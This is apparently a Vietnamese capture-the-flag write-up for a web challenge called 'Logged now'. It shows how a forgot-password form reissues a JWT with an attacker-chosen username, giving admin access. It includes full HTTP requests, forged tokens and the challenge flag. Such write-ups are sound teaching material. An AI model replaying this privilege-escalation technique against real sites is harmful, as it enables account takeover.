# Logged now

Address: http://172.104.49.143:1579/

Try to logging in 

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451751-3379e6ea-b3fe-448a-ad89-14415a6897dd.png" width="50%">
</p>

Check page source ta thấy
<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451781-db9a4f24-098e-4fd0-8ec7-25fa7c387268.png" width="50%">
</p>


Đăng nhập acc `test/test`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451798-5c2f3a3f-3572-4b56-8fc2-51b3ddce848c.png" width="50%">
</p>


Check history ta có

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451827-eb16dc00-f196-4d6a-b5f2-742409f421ef.png" width="50%">
</p>

Lại có JWT rồi kìa :) Dùng token.dev nhé

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193451874-f8e0e42b-a070-41c7-8c5d-3323dc6a8c9d.png" width="100%">
</p>

Mục tiêu là sẽ đổi `username` thành `admin` 

Check tiếp JWT tiếp theo

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193452003-22898fd3-81ba-4edf-ac1b-18c0af39f2c8.png" width="100%">
</p>

Đăng xuất nào...

Thử tính năng `forgot password`

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193452052-0071c58c-3805-4f14-95d7-3f7b281e730a.png" width="50%">
</p>

Khi submit thì nó tạo ra lỗi nhưng mà khi check Token nó vẫn thay đổi

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193452060-1054cd5e-1ba5-4791-b181-0d6000a3246f.png" width="50%">
</p>

Khi đăng xuất

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193452100-3bb91cfa-396a-482c-8425-b94e3a4e0b2d.png" width="100%">
</p>

Khi submit

<p align="center">
<img src = "https://user-images.githubusercontent.com/93431512/193452136-65c0f993-c749-4e8f-a3bb-3aae2e4c1cd4.png" width="100%">
</p>

Khi submit ta thấy Token cũng bị thay đổi, có vẻ như là username sẽ bị thay đổi từ tính năng này, cái ta cần là `username = admin` và `islogged = True`, ta có thể dựa vào acc test để lấy `islogged = True` và dùng `forgot password` để lấy `username` mới 

```http
POST /forgotpassword HTTP/1.1
Host: 172.104.49.143:1579
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.104.49.143:1579
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.104.49.143:1579/forgotpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpc2xvZ2dlZCI6dHJ1ZX0.Wjx11deR5S7aTH2Sdruo0t0CVQTIJV7wGhLIYPRFlOY
Connection: close

username=admin
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 02 Oct 2022 11:43:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1241
Connection: close
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNsb2dnZWQiOnRydWV9.sYB9cy-O6WDAfSEpF7dL5wTzmlejiR0xrI5ymMbsTWw; Path=/
....
```

Check token mới, mì ăn liền =)))
![image](https://user-images.githubusercontent.com/93431512/193452276-209469ef-f50a-4ac6-b391-941f1214a507.png)

```http
GET /info HTTP/1.1
Host: 172.104.49.143:1579
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNsb2dnZWQiOnRydWV9.sYB9cy-O6WDAfSEpF7dL5wTzmlejiR0xrI5ymMbsTWw
Connection: close
```
Và ta có flag: `Flag{uAsNp2OK2a3DBMXYR!i#}`
        




